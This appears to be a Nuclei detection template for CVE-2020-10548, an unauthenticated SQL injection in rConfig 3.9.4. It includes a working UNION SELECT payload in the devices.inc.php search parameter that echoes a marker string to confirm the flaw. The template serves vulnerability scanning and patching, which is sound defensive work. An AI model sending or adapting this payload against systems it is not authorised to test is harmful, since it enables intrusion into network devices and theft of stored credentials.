id: CVE-2020-10548
info:
  name: rConfig 3.9.4 - SQL Injection
  author: madrobot
  severity: critical
  description: rConfig 3.9.4 and previous versions contain an unauthenticated SQL
    injection vulnerability (CVE-2020-10548) that allows attackers to gain access
    to monitored network devices and move laterally due to the storage of node passwords
    in cleartext.
  reference:
  - https://github.com/theguly/exploits/blob/master/CVE-2020-10548.py
  - https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-10548
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-10548
    cwe-id: CWE-89,CWE-522
  tags: cve,cve2020,rconfig,sqli
  metadata:
    impact: The SQL injection vulnerability in rConfig 3.9.4 and previous versions
      can result in lateral movement and provide attackers with access to monitored
      network devices, due to the clear-text storage of nodes' passwords.
    recommendation: I highly recommend updating rConfig to version 3.9.5 or newer
      to address the SQL injection vulnerability and prevent potential lateral movement
      by attackers in accessing network devices.
requests:
- method: GET
  path:
  - '{{BaseURL}}/devices.inc.php?search=True&searchField=antani''+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+--+&searchColumn=n.id&searchOption=contains'
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    words:
    - '[project-discovery]'
    part: body
